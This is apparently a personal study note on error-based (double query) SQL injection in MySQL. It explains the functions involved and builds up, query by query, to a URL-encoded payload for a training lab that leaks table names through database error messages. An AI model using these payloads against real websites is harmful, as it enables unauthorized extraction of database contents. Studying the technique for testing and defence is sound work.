# Error Based (Double Query) SQL Injection

- `A double query` combining two queries into a single query and getting the information through the SQL error message from the database. 

- Union injection can not be used when the web pages fail to retrieve any results (Error, Expected Results) from the database while we inject it with a single query, Then we should use double query SQL injection technique. It is a manual injection technique to dump the data from the database.

[Reference](https://securiumsolutions.com/blog/sql-injection-by-double-query-securiumsolutions/#:~:text=A%20double%20query%20SQL%20injection,error%20message%20from%20the%20database.)


# Mysql Query for Error Based Injection

## 1. `Sub-Query` or `Double Query`

- `A subquery is a SQL query nested inside a larger query.`

- A subquery may occur in :
    - A SELECT clause
    - A FROM clause
    - A WHERE clause
The subquery can be nested inside a SELECT, INSERT, UPDATE, or DELETE statement or inside another subquery.
A subquery is usually added within the WHERE Clause of another SQL SELECT statement.


## 2. `rand()` 

- This function return random decimal number between 0 and 1.

## 3. `floor()`

- The function retrun largest inter value.(Less than or equal to a number)

## 4. `Group by`

- aggregate same values in the coulumn as single value

## 5. `count`

- Count the no. of rows that present in the database




# Theory of Error Based or Double Query Injection


1. Combine two queries into single query 
2. Use SQL_function and make application to show error message
3. dump juicy info through error message



# Example mysql_function to make application error

## 1. count()

`select count(*) from information_schema.tables;`

- display how many row in `information_schema.tables;`

## 2. rand() and floor()

`select rand();`
`select floor(rand()*2);`
`select floor(rand()*2)test;`


## 3. Double Query and Make Application Error

#### Extract Juicy info from error

`select x from y;`

#### Double Query

- `select database();`

- `select concat("::",database(),"::","CONCAT FUNCTION");`

- `select concat("::",database(),"::",floor(rand()*2));`

#### adding variable `a`

- `select concat("::",database(),"::",floor(rand()*2))a from information_schema.columns;`

#### `group by` with a

- `select concat("::",database(),"::",floor(rand()*2))a from information_schema.columns group by a;`


#### use `count()` and making web application to error

`select count(*), concat("::",database(),"::",floor(rand()*2))a from information_schema.columns group by a;`

#### Modified query
`select(select 1 from (select count(*), concat("::",database(),"::",floor(rand()*2))a from information_schema.columns group by a)b);`


#### insert this query to `,database(),` area

`(select table_name from information_schema.tables where table_schema=database() limit 0,1)`



#### lab Full Query Query (ZD-Lab,SQLI,Lesson-5)

`AND+(select+1+from(select count(*), concat("::",(select table_name from information_schema.tables where table_schema=database() limit 0,1),"::",floor(rand()*2))a from information_schema.columns group by a)b)--+`




























